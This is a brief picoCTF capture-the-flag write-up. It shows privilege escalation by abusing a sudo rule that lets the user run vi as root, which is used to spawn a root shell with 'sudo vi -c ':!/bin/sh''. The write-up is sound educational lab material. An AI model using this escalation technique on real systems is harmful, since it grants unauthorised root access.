# Challenge: [Permissions](https://play.picoctf.org/practice/challenge/363)
50 Points
# Description
Can you read files in the root file?
# Solution
Because the goal was trying to read files in the root directory, meaning I needed to have the root privilege or leveraged from 
something to escalate my current privilege.

First of all, I checked the sudo permissions of the current user.

```sh
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Great, **(ALL) /usr/bin/vi** was a point I can leverage, it showed that I was able to run the `vi` command with root privilege,
doesn't matter I had execution permisson or not.

Vi is a powerfull editor which I can execute system command via `:!`, since vi was running as root, any commands executed 
through it would also run with root privileges.

So I spawned a root shell then.

```sh
picoplayer@challenge:~$ sudo vi -c ':!/bin/sh'
[sudo] password for picoplayer: 

# ls
# whoami
root
# 
```

Finally, I accessed the root directory and read the flag file.
